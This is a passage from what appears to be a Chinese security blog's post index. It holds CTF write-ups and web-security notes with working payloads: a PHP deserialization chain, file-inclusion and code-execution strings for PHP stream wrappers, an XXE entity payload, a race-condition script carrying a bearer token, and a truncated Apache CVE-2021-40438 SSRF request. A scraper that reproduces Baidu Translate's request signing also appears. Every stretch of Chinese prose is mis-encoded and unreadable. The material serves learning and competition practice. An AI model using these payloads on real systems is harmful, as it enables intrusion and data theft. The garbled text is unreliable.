ÂáΩÊï∞ÊòØÂΩì‰ªéÂ§ñÈÉ®ËÆøÈóÆÁ±ª‰∏≠ÁöÑÁßÅÊúâÂ±ûÊÄßÁöÑÊó∂ÂÄô‰ºöËá™Âä®Ë∞ÉÁî®ÔºåÂèÇÊï∞ $name ÊòØÊâÄËÆøÈóÆÁöÑÂ±ûÊÄßÂêç„ÄÇ\n‚Äã    ÂêåÊó∂Ë¶ÅÁü•ÈÅìÂú® php ‰∏≠Ë∞ÉÁî®Á±ª‰∏≠ÁöÑÂáΩÊï∞ËøòÊúâ‰∏ÄÁßç‰∏çÂ∏∏Áî®ÁöÑÊñπÊ≥ïÔºåÂ¶Ç‰∏ã\n&lt;?php\n\nclass test &#123;\n    public function testFunc() &#123;\n        echo 'test success!!!';\n        echo '&lt;br/>Ë∞ÉÁî®‰∫ÜÂáΩÊï∞testFunc()';\n    &#125;\n&#125;\n$obj = new test();\n[$obj, 'testFunc']();//Ë∞ÉÁî®objÂØπË±°‰∏≠ÁöÑ testFunc()\n\nËøêË°åÁªìÊûúÂ¶Ç‰∏ã\n\nËøô‰∏ÄÁÇπÁî®Âú®‰∫Ü‰∏äÈù¢‰æãÈ¢òÁöÑ  $var[$name]();\n‚Äã    ÊääËØ•Ëß£ÈáäÁöÑÈÉΩËß£Èáä‰∫ÜÔºåÈÇ£Êé•‰∏ãÊù•Â∞±ËØ¥ËØ¥ËøôÈ¢òÊÄé‰πàÂéªÂÅö„ÄÇËøôÈ¢òÂÖ∂ÂÆûËøòÊòØÊúâÁÇπÂ§çÊùÇÁöÑÔºåÂ∞±ÂÄü‰∏ÄÂº†ÂõæÊù•ËØ¥Âêß„ÄÇ\n\nÂØπÂ∫î‰ª£Á†Å\n&lt;?php\nclass one &#123;\n    public $object;\n&#125;\n\nclass second &#123;\n    protected $filename;\n    public function __construct($filename)&#123;\n        $this->filename=$filename;\n    &#125;\n&#125;\n\nclass third &#123;\n    private $string;\n\n    public function __construct($string) &#123;\n        $this->string = $string;\n    &#125;\n&#125;\n\n$obj1 = new one();\n$obj2 = new one();\n$obj3 = new one();\n$obj3->year_parm = ['Happy_func'];\n$obj2->object = new third(['string'=>[$obj3,'MeMeMe']]);\n$obj1->object =  new second($obj2);\n\n$payload = serialize($obj1);\n\necho urlencode($payload);\n\nËøêË°åÂæóÂà∞payload\nO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7D\n\n","categories":["webÂÆâÂÖ®Âü∫Á°Ä"],"tags":["php","ÂèçÂ∫èÂàóÂåñ"]},{"title":"php‰º™ÂçèËÆÆÁÆÄÂçïÊÄªÁªì","url":"/2022/03/01/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/","content":"ÁÆÄ‰ªãÈ¶ñÂÖàÊù•Áúã‰∏Ä‰∏ãÊúâÂì™‰∫õÊñá‰ª∂ÂåÖÂê´ÂáΩÊï∞Ôºö\ninclude()„ÄÅrequire()„ÄÅinclude_once()„ÄÅrequire_once()„ÄÅhighlight_file()\nshow_source() „ÄÅreadfile() „ÄÅfile_get_contents() „ÄÅfopen() „ÄÅfile()\n\n\n\nÊúâÂì™‰∫õ‰º™ÂçèËÆÆÔºö\nfile:// ‚Äî ËÆøÈóÆÊú¨Âú∞Êñá‰ª∂Á≥ªÁªü\nhttp:// ‚Äî ËÆøÈóÆ HTTP(s) ÁΩëÂùÄ\nftp:// ‚Äî ËÆøÈóÆ FTP(s) URLs\nphp:// ‚Äî ËÆøÈóÆÂêÑ‰∏™ËæìÂÖ•/ËæìÂá∫ÊµÅÔºàI/O streamsÔºâ\nzlib:// ‚Äî ÂéãÁº©ÊµÅ\ndata:// ‚Äî Êï∞ÊçÆÔºàRFC 2397Ôºâ\nglob:// ‚Äî Êü•ÊâæÂåπÈÖçÁöÑÊñá‰ª∂Ë∑ØÂæÑÊ®°Âºè\nphar:// ‚Äî PHP ÂΩíÊ°£\nssh2:// ‚Äî Secure Shell 2\nrar:// ‚Äî RAR\nogg:// ‚Äî Èü≥È¢ëÊµÅ\nexpect:// ‚Äî Â§ÑÁêÜ‰∫§‰∫íÂºèÁöÑÊµÅ\n\nËØ¶ÁªÜËß£ËØªphp:&#x2F;&#x2F;filterÔºàËØªÊñá‰ª∂Ôºâphp:&#x2F;&#x2F;filterÁî®‰∫éËØªÂèñÊ∫êÁ†ÅÔºåphp:&#x2F;&#x2F;inputÁî®‰∫éÊâßË°åphp‰ª£Á†Å\n?page=php://filter/read=convert.base64-encode/resource=/flag.php\n\nfile:&#x2F;&#x2F;ÂçèËÆÆ  (ËØªÊñá‰ª∂)Áî®‰∫éËÆøÈóÆÊú¨Âú∞Êñá‰ª∂Á≥ªÁªüÔºå‰∏çÂèóallow_url_fopen‰∏éallow_url_includeÁöÑÂΩ±Âìç\nÂç≥file:&#x2F;&#x2F; [Êñá‰ª∂ÁöÑÁªùÂØπË∑ØÂæÑÂíåÊñá‰ª∂Âêç]\n?path=file:///var/www/html/flag.txt\n\nphp:&#x2F;&#x2F;input (Â∞ÜpostËØ∑Ê±ÇÂΩì‰Ωúphp‰ª£Á†ÅÊâßË°å)php:&#x2F;&#x2F;input ÂèØ‰ª•ËÆøÈóÆËØ∑Ê±ÇÁöÑÂéüÂßãÊï∞ÊçÆÁöÑÂè™ËØªÊµÅ, Â∞ÜpostËØ∑Ê±Ç‰∏≠ÁöÑÊï∞ÊçÆ‰Ωú‰∏∫PHP‰ª£Á†ÅÊâßË°å\nphp:&#x2F;&#x2F;input ÂèØ‰ª•Áî®Êù•ÁîüÊàê‰∏ÄÂè•ËØùÊú®È©¨\nÂà©Áî®ËØ•ÊñπÊ≥ïÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÂÜôÂÖ•phpÊñá‰ª∂ÔºåËæìÂÖ•file&#x3D;php:&#x2F;&#x2F;inputÔºåÁÑ∂Âêé‰ΩøÁî®burpÊäìÂåÖÔºåÂÜôÂÖ•php‰ª£Á†ÅÔºö\ndata:&#x2F;&#x2F;ÂçèËÆÆ (ÂÜôÂÖ•)Âà©Áî®data:&#x2F;&#x2F; ‰º™ÂçèËÆÆÂèØ‰ª•Áõ¥Êé•ËææÂà∞ÊâßË°åphp‰ª£Á†ÅÁöÑÊïàÊûúÔºå‰æãÂ¶ÇÊâßË°åphpinfo()ÂáΩÊï∞Ôºö\n?page=data://text/plain,&lt;?php%20phpinfo();?>\n\nÂ¶ÇÊûúÊ≠§Â§ÑÂØπÁâπÊÆäÂ≠óÁ¨¶ËøõË°å‰∫ÜËøáÊª§ÔºåÊàë‰ª¨ËøòÂèØ‰ª•ÈÄöËøábase64ÁºñÁ†ÅÂêéÂÜçËæìÂÖ•Ôºö\n?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\nzip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;ÂçèËÆÆzip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; ÂùáÂ±û‰∫éÂéãÁº©ÊµÅÔºåÂèØ‰ª•ËÆøÈóÆÂéãÁº©Êñá‰ª∂‰∏≠ÁöÑÂ≠êÊñá‰ª∂Ôºå‰∏çÈúÄË¶ÅÊåáÂÆöÂêéÁºÄÂêç\nÂ¶ÇÊûúÁΩëÁ´ôÂÖÅËÆ∏Êàë‰ª¨‰∏ä‰º†ÂéãÁº©Êñá‰ª∂ÔºåÊàë‰ª¨‰πüÂèØ‰ª•Â∞ÜphpÊñá‰ª∂ÂéãÁº©ÂêéËøõË°å‰∏ä‰º†ÔºåÂÜçÈÄöËøázip:&#x2F;&#x2F;ÂçèËÆÆÊâßË°å„ÄÇ\n","categories":["webÂÆâÂÖ®Âü∫Á°Ä"],"tags":["php","php‰º™ÂçèËÆÆ"]},{"title":"ËÆ∞ÂØπÁôæÂ∫¶ÁøªËØëÁöÑ‰∏ÄÊ¨°Áà¨Ëô´ÁªÉ‰π†","url":"/2022/02/23/baidufanyi-project/","content":"ÊúÄËøëÁÆÄÂçïÂ≠¶‰π†‰∫Ü‰∏Ä‰∏ã requests Ëøô‰∏™Ê®°ÂùóÔºå‰∏ÄÁõ¥Ê≤°Êúâ‰∫≤Ëá™ÂÆûÊàò‰∏Ä‰∏ãÔºåÁÑ∂ÂêéÂ∞±Êúâ‰∫ÜËøôÊ¨°ÁöÑÂÆûÊàòÁªÉ‰π†\nÊµèËßàÂô®F12ÂØπÁôæÂ∫¶ÁøªËØëËøõË°åÊäìÂåÖ\nÈöè‰æøËæìÂÖ•‰∏Ä‰∏™ËØçÂè•ÊäìÂåÖ\nÊàë‰ª¨‰∏ªË¶ÅË¶ÅËé∑ÂèñËøôÈáåÁöÑÊï∞ÊçÆ\n\nËÄåËøôÈáåÁöÑÊï∞ÊçÆÊòØÂØπhttps://fanyi.baidu.com/v2transapi?from=zh&amp;to=enËøô‰∏™ÈìæÊé•ÂèëËµ∑ÁöÑ‰∏ÄÊ¨°postËØ∑Ê±Ç\nÂèØ‰ª•ÁúãÂà∞ËØ∑Ê±ÇË°®Âçï‰∏≠ÂèëÈÄÅÁöÑÂÖ≥ÈîÆÊï∞ÊçÆ\n\nÂ∞ùËØïÂÖ∂‰ªñËØçÂè•ÂèëÁé∞‰∏ªË¶ÅÂèòÂåñÁöÑÊòØsignÔºåËøòÊúâtokenËøô‰∏§‰∏™ÂÖ≥ÈîÆÂèòÈáè\nÂú®ÂΩìÂâçÈ°µÈù¢ÂÆ°Êü•ÂÖÉÁ¥†Â∞±ËÉΩÂèëÁé∞Ëøô‰∏™token\n\nÁé∞Âú®ÂÖ≥ÈîÆÊòØËøô‰∏™sign\nÊü•Áúã‰∏Ä‰∏ãËøô‰∏™postÊñπÊ≥ïÁöÑËØ∑Ê±ÇÊ†à\n\n‰∏ªË¶ÅÊòØindexÂíåpublicËøô‰∏§‰∏™jsÊñá‰ª∂ÔºåÊâìÂºÄÊêúÁ¥¢‰∏Ä‰∏ãpayload‰∏≠ÁöÑsignÔºåÂèëÁé∞Âú®indexËøô‰∏™jsÊñá‰ª∂ÈáåÊúâËøô‰∏™payload\n\nÂèØ‰ª•ÂèëÁé∞ËøôÈáåÂíåpostË°®Âçï‰∏≠ÁöÑÊï∞ÊçÆÊ†ºÂºè‰∏ÄÊ†∑\n\nÁé∞Âú®ÁúãÁúãËøô‰∏™signÂÆÉÊòØÊÄé‰πàÁîüÊàêÁöÑ\nÂú®sign: L(e)ËøôÈáåÊâì‰∏Ä‰∏™Êñ≠ÁÇπË∞ÉËØï‰∏Ä‰∏ã\nÂà∑Êñ∞È°µÈù¢ÔºåÊù•Âà∞Ëøô‰∏™signÂ§ÑÔºåÁÑ∂ÂêéÁÇπÂáªÂçïÊ≠•Ë∞ÉËØï\n\nÁÑ∂ÂêéË∑≥ËΩ¨Âà∞‰∫Üe(r)Ëøô‰∏™ÂáΩÊï∞ÔºåËøô‰∏™Â∫îËØ•Â∞±ÊòØÁîüÊàêsignÁöÑÂáΩÊï∞\n\nÂêåÊó∂ÂèëÁé∞‰º†ÈÄíÁöÑÂèÇÊï∞Ê≠£Â•ΩÊòØ‰Ω†ËæìÂÖ•ÁöÑËØçÂè•\nÈÇ£‰πàÁªßÁª≠ÂçïÊ≠•Ë∞ÉËØïÔºåÂà∞ÂáΩÊï∞ÁöÑÊú´Â∞æÂèëÁé∞ÂèàË∞ÉÁî®‰∫Ü‰∏Ä‰∏™n(r, o)ÂáΩÊï∞\n\nÁªßÁª≠ËøêË°åÔºåÁªìÊùü\nÁªèËøá‰∏äÈù¢ÁöÑË∞ÉËØïÂèëÁé∞ÔºåËøô‰∏™signÂ∞±ÊòØ‰ΩøÁî®‰∫Ü‰∏äÈù¢‰∏§‰∏™ÂáΩÊï∞ÂØπËæìÂÖ•ÁöÑËØçÂè•ËøõË°åÂä†ÂØÜÊìç‰ΩúÔºåÂÖ∑‰ΩìÁöÑÁÆóÊ≥ïÊØîËæÉÂ§çÊùÇÔºå‰∏çÈúÄË¶ÅÊêûÊáÇÂÆÉÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®python‰∏≠ÁöÑexecujsËøô‰∏™Â∫ìÊù•ËøêË°åÔºåËøô‰∏™js‰ª£Á†ÅÔºåÂæóÂà∞Âä†ÂØÜÂêéÁöÑsign\nÂÖà‰∏çË¶ÅÊÄ•ÔºåÂú®ÊµèËßàÂô®Ë∑ë‰∏Ä‰∏ãËøô‰∏™Âä†ÂØÜ‰ª£Á†Å\ncvÂà∞ÊéßÂà∂Âè∞ÔºåËæìÂÖ•ÂèÇÊï∞ËøêË°å\n\nÂèëÁé∞Êä•Èîô‰∫ÜÔºåÊü•ÁúãÊä•ÈîôÂàóË°®Áü•ÈÅìÊòØ i Ëøô‰∏™ÂèòÈáèÊ≤°ÊúâÂÆö‰πâ\nÈÇ£‰πàÁªßÁª≠ÂõûÂà∞ÂéüÊù•ÁöÑË∞ÉËØï\nÊâæÂà∞Ëøô‰∏™ÂèòÈáè i ÔºåÊâì‰∏™Êñ≠ÁÇπ\n\nËøêË°åÔºåÂèëÁé∞Ëøô‰∏™ÂèòÈáè i ÁöÑÂÄº‰∏∫ 320305.131321201\n\nÊîπÂèòËæìÂÖ•ÁöÑËØçÂè•ÂèëÁé∞Ëøô‰∏™ i ÂßãÁªàÊòØ‰∏™ÂÆöÂÄºÔºåÈÉΩÊòØ 320305.131321201 ÔºåÈÇ£‰πàÁé∞Âú®ÊâÄÊúâÁöÑÈóÆÈ¢òÂü∫Êú¨‰∏äÂ∞±Ëß£ÂÜ≥‰∫ÜÔºå\nÂâ©‰∏ãÁöÑÂ∞±ÊòØÂÜôÁà¨Ëô´ËÑöÊú¨Ôºå‰ª£Á†ÅÂ¶Ç‰∏ã\nÂØπÂ∫î sign ÁöÑjs‰ª£Á†Å\ni = '320305.131321201';\n\nfunction n(r, o) &#123;\n    for (var t = 0; t &lt; o.length - 2; t += 3) &#123;\n      var a = o.charAt(t + 2);\n      a = a >= 'a' ? a.charCodeAt(0) - 87 : Number(a),\n      a = '+' === o.charAt(t + 1) ? r >>> a : r &lt;&lt; a,\n      r = '+' === o.charAt(t) ? r + a &amp; 4294967295 : r ^ a\n    &#125;\n    return r\n  &#125;\n  function e(r) &#123;\n    var o = r.match(/[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]/g);\n    if (null === o) &#123;\n      var t = r.length;\n      t > 30 &amp;&amp; (r = '' + r.substr(0, 10) + r.substr(Math.floor(t / 2) - 5, 10) + r.substr( - 10, 10))\n    &#125; else &#123;\n      for (var e = r.split(/[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]/), C = 0, h = e.length, f = [\n      ]; h > C; C++) '' !== e[C] &amp;&amp; f.push.apply(f, a(e[C].split(''))),\n      C !== h - 1 &amp;&amp; f.push(o[C]);\n      var g = f.length;\n      g > 30 &amp;&amp; (r = f.slice(0, 10).join('') + f.slice(Math.floor(g / 2) - 5, Math.floor(g / 2) + 5).join('') + f.slice( - 10).join(''))\n    &#125;\n    var u = void 0,\n    l = '' + String.fromCharCode(103) + String.fromCharCode(116) + String.fromCharCode(107);\n    u = null !== i ? i : (i = window[l] || '') || '';\n    for (var d = u.split('.'), m = Number(d[0]) || 0, s = Number(d[1]) || 0, S = [\n    ], c = 0, v = 0; v &lt; r.length; v++) &#123;\n      var A = r.charCodeAt(v);\n      128 > A ? S[c++] = A : (2048 > A ? S[c++] = A >> 6 | 192 : (55296 === (64512 &amp; A) &amp;&amp; v + 1 &lt; r.length &amp;&amp; 56320 === (64512 &amp; r.charCodeAt(v + 1)) ? (A = 65536 + ((1023 &amp; A) &lt;&lt; 10) + (1023 &amp; r.charCodeAt(++v)), S[c++] = A >> 18 | 240, S[c++] = A >> 12 &amp; 63 | 128) : S[c++] = A >> 12 | 224, S[c++] = A >> 6 &amp; 63 | 128), S[c++] = 63 &amp; A | 128)\n    &#125;\n    for (var p = m, F = '' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(97) + ('' + String.fromCharCode(94) + String.fromCharCode(43) + String.fromCharCode(54)), D = '' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(51) + ('' + String.fromCharCode(94) + String.fromCharCode(43) + String.fromCharCode(98)) + ('' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(102)), b = 0; b &lt; S.length; b++) p += S[b],\n    p = n(p, F);\n    return p = n(p, D),\n    p ^= s,\n    0 > p &amp;&amp; (p = (2147483647 &amp; p) + 2147483648),\n    p %= 1000000,\n    p.toString() + '.' + (p ^ m)\n  &#125;\n\n\n\npythonËÑöÊú¨\nimport execjs\nimport requests\nimport re\nimport json\nmainUrl = 'https://fanyi.baidu.com'\ntrsUrl = 'https://fanyi.baidu.com/v2transapi'\n\nwith open('sign.js', 'r') as file:# sign.js‰ªéÊµèËßàÂô®ÂØπÂ∫îÁöÑÊñá‰ª∂‰∏≠Â§çÂà∂ËøáÊù•\n    jsCode = file.read()\n\nsession = requests.session()\nindexResp = session.get(mainUrl)\ntoken = re.findall(\"token: '(.*?)'\", indexResp.text)[0]\n\ndef translate(word):\n    data = &#123;\n        # ËøôÈáåÂ∞ÜfromÂíåtoÂèÇÊï∞Êîπ‰∏∫autoÂèëÁé∞ÂèØ‰ª•‰ªªÊÑèËØ≠Ë®ÄÁøªËØë‰∏∫‰∏≠ÊñáÔºå‰∏≠ÊñáÁøªËØë‰∏∫Ëã±ÊñáÔºåÂèØËá™Âä®ÂàáÊç¢\n        \"from\": \"auto\",\n        \"to\": \"auto\",\n        \"query\": word,\n        \"transtype\": \"realtime\",\n        \"simple_means_flag\": \"3\",\n        \"sign\": execjs.compile(jsCode).call('e', word),\n        \"token\": token,\n        \"domain\": \"common\"\n    &#125;\n    return session.post(trsUrl, data=data).text\nif __name__ == '__main__':\n    word = input('ËØ∑ËæìÂÖ•Ë¶ÅÁøªËØëÁöÑËØçÂè•: ')\n    response = translate(word)\n    print(json.loads(response)['trans_result']['data'][0]['dst'])\n\nÊúÄÂêéÊµãËØïÔºå‰∏≠Ëã±ÊñáÈÉΩÊ≤°ÈóÆÈ¢ò\n\n\n","categories":["Áà¨Ëô´"],"tags":["Áà¨Ëô´","python"]},{"title":"HGAME 2022 Week4 writeup by pankas","url":"/2022/02/17/week4-pankas/","content":"ÊúÄÂêé‰∏ÄÂë®ÊàëÂèàÊëÜÁÉÇ‰∫Ü„ÄÇ    (QAQ)\nwebCommentÊü•Áúã‰∏ãÊ∫êÁ†Å\nÂÖ≥ÈîÆÈÉ®ÂàÜ\nfunction parseXML($str) &#123;\n    $dom = new DOMDocument();\n    try &#123;\n        $dom->loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD);\n    &#125; catch (Exception $e) &#123;\n        http_response_code(400);\n        echo json_encode(['error' => 'invalid xml data']);\n        die();\n    &#125;\n    $attrs = simplexml_import_dom($dom);\n    if (!isset($attrs->content)) &#123;\n        http_response_code(400);\n        echo json_encode(['error' => 'content is empty']);\n        die();\n    &#125;\n    if (waf($attrs->sender) || waf($attrs->content)) &#123;\n        http_response_code(403);\n        echo json_encode(['error' => 'Hacker!']);\n        die();\n    &#125;\n    if ($attrs->sender == 'admin' &amp;&amp; !preg_match('/admin/i', $str)) &#123;\n        $flag = 'hgame&#123;xxxxx&#125;';\n        $attrs->content = $flag;\n    &#125;\n    return $attrs;\n&#125;\n\nÁªìÂêàÂâçÁ´ØpostÁöÑËØ∑Ê±Ç\n\nËøôÈáåÂ≠òÂú®XXEÊºèÊ¥û\nÈÇ£‰πàË¶ÅËÆ©postÁöÑÂ≠óÁ¨¶‰∏≤Ê≤°Êúâadmin‰ΩÜÊòØËΩ¨ÂåñÂêéÁöÑXMLÂØπË±°ÁöÑ&lt;sender&gt;Ë¶Å‰∏∫admin\nËøôÈáåwafËøáÊª§‰∫ÜÂæàÂ§ö‰º™ÂçèËÆÆÔºå‰ΩÜdata://‰º™ÂçèËÆÆÊ≤°ÊúâËøáÊª§\nÊâÄ‰ª•ÂèØ‰ª•ÊûÑÈÄ†payload\n&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY payload SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,YWRtaW4&#x3D;&quot;&gt; \n]&gt;\n&lt;comment&gt;&lt;sender&gt;&amp;payload;&lt;&#x2F;sender&gt;&lt;content&gt;flag&lt;&#x2F;content&gt;&lt;&#x2F;comment&gt;\n\nÂÖ∂‰∏≠YWRtaW4=‰∏∫adminÁöÑbase64ÁºñÁ†ÅÔºåËøôÊ†∑Ê£ÄÊµãÂ≠óÁ¨¶‰∏≤Êó∂Ê≤°ÊúâadminÔºå‰ΩÜÂÆû‰æãÂåñxmlÂØπË±°ÂêéÁî±‰∫édata‰º™ÂçèËÆÆ&lt;sender&gt;Âèò‰∏∫‰∫ÜadminÔºåÊãøÂà∞flag\n\n","categories":["CTF-WP"],"tags":["CTF","HGAME"]},{"title":"HGAME 2022 Week3 writeup by pankas","url":"/2022/02/10/week3-pankas/","content":"week3ËøáÂπ¥ÊëÜ‰∫ÜÔºåÂü∫Êú¨Ê†πÊú¨Ê≤°ÂÅöÔºåÊÉ≠ÊÑß¬∑¬∑¬∑¬∑¬∑¬∑¬∑¬∑¬∑\nwebVidar shop demoÊù°‰ª∂Á´û‰∫âÔºåÂºÄÂ§öÁ∫øÁ®ãÂà∑Èí±ÔºåÂ§ü‰∫ÜÂ∞±ÂèØ‰ª•‰π∞flag‰∫Ü\nimport requests\nimport threading\nimport json\npayUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/pay/create'\ncreateOrderUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/order/create'\nsellUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/order/remove'\nheaders = &#123;\n        'Host': '4766634820.vidar-shop.mjclouds.com',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',\n        'Accept': 'application/json, text/plain, */*',\n        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',\n        'Accept-Encoding': 'gzip, deflate',\n        'Content-Type': 'application/json',\n        'Authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDQyMDYzODUsImlhdCI6MTY0NDExOTk4NSwidWlkIjozNTF9.c4d_p8TutNYanYK7KPIJwuLFR9tkAIvdLZFhqPT_0jE',\n        'Origin': 'http://4766634820.vidar-shop.mjclouds.com',\n        'Connection': 'keep-alive',\n        'Referer': 'http://4766634820.vidar-shop.mjclouds.com/'\n    &#125;\ncreateData = &#123;\n        \"amount\": 1,\n        \"pid\": 5,\n        \"status\": 1,\n        \"uid\": 351\n    &#125;\ndef pay():\n    response = requests.post(createOrderUrl, data=json.dumps(createData), headers=headers)\n    oid = json.loads(response.text)['id']\n    payData = &#123;\n        'amount': 20,\n        'oid': oid,\n        'uid': 351\n    &#125;\n    requests.post(payUrl, data=json.dumps(payData), headers=headers)\n    return oid\ndef sell(oid):\n    # print(oid)\n    sellData = &#123;\n        'id': oid\n    &#125;\n    r = requests.post(sellUrl, data=json.dumps(sellData), headers=headers)\n    print(r.text)\ndef solve():\n    oid = pay()\n    for j in range(50):\n        threading.Thread(target=sell(oid)).start()\nif __name__ == '__main__':\n    for i in range(20):\n        threading.Thread(target=solve()).start()\n\n\n\n","categories":["CTF-WP"],"tags":["CTF","HGAME"]},{"title":"HGAME 2022 Week2 writeup by pankas","url":"/2022/02/03/week2-pankas/","content":"webApache!ÊâìÂºÄÈ¢òÁõÆF12Êü•ÁúãÊ∫êÁ†ÅÂèëÁé∞hint\n\n‰∏ãËΩΩÈôÑ‰ª∂ÂæóÂà∞ApacheÁöÑÈÖçÁΩÆÊñá‰ª∂\nÂú®default.confÊñá‰ª∂‰∏ãÂèëÁé∞flagÂú®**&#x2F;falg**ÔºåÂπ∂‰∏î500Ëøô‰∏™È°µÈù¢‰πüÊúâÊèêÁ§∫Ë¶ÅÂú®ÂÜÖÁΩëÊâçËÉΩËÆøÈóÆÂà∞Ê†πÁõÆÂΩïÁöÑflag\nÁªìÂêàhintÂèØ‰ª•Áü•ÈÅìË¶ÅÁî®Âà∞ApacheÁöÑCVE-2021-40438Ëøô‰∏™ÊºèÊ¥ûÔºåÊú¨Ë¥®Â∞±ÊòØSSRF\nÂèÇËÄÉÊñáÁ´†Ôºö\nCVE-2021-40438 poc|Apache SSRFÊºèÊ¥ûpoc - üî∞Èõ®ËãÅ‚Ñíüî∞ (ddosi.org)\nÂàôÂèØ‰ª•ÊûÑÈÄ†payload\nGET /proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA